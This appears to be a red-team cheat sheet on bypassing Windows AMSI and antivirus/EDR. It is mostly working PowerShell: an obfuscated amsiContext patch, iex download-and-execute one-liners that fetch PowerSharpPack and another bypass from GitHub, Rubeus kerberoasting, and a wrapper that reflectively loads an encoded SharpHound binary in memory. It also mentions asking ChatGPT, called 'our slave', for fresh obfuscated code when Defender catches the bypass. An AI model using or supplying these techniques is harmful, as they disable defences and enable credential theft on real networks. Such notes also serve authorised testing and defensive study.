# AMSI Bypass

## AV and EDR Bypass

> If this is detected by Defender, you can request another obfuscated code from our slave (ChatGPT).

```powershell
$a = 'System.Management.Automation.' + 'Am' + 'siUt' + 'ils';
$b = [Ref].Assembly.GetType($a);
$c = $b.GetField('am' + 'siCo' + 'ntext', [Reflection.BindingFlags]'NonPublic,Static');
$d = $c.GetValue($null);
[Runtime.InteropServices.Marshal]::WriteInt32($d, 0x41 + 0x42 + 0x43 + 0x44);
```

After that, you can use another AMSI bypass to execute EXEs.

- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

```powershell
# Using Hardoware breackpoint in this case
# https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#using-hardware-breakpoints
# Simply copy and paste
```

Now you can import the binaries and binaries detected by AV and run commands with PowerSharpPack tool

> If you have no access to the internet, you can change the URL to an internal Kali.

```powershell
# Import tools
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpPack.ps1')
PowerSharpPack -seatbelt -Command "AMSIProviders"
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
# or import just one file per tool
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/refs/heads/master/PowerSharpBinaries/<file>.ps1')
# Here you can use
Invoke-Certify -Command ""
# ...
Invoke-Rubeus -Command ""
# and so on
```

Also you can create a exe to ps1 file and execute it, we create Invoke-Bloodhound.ps1

```powershell
.\GzipB64.exe C:\Users\MALDEV01\Downloads\SharpHound-v2.5.13\SharpHound.exe
# Save base64 code
```

```powershell
function Invoke-BloodHound
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("<insert base64 code here>"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    # Setting a custom stdout to capture Console.WriteLine output
    # https://stackoverflow.com/questions/33111014/redirecting-output-from-an-external-dll-in-powershell
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [AnschnallGurt.Program]::Main($Command)

     # Restore the regular STDOUT object
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
```


## Option 1 (Detected by AV)

- https://github.com/V-i-x-x/AMSI-BYPASS/


```powershell
IEX (New-Object System.Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/main/POC.ps1
’); MagicBypass -InitialStart 0x50000
```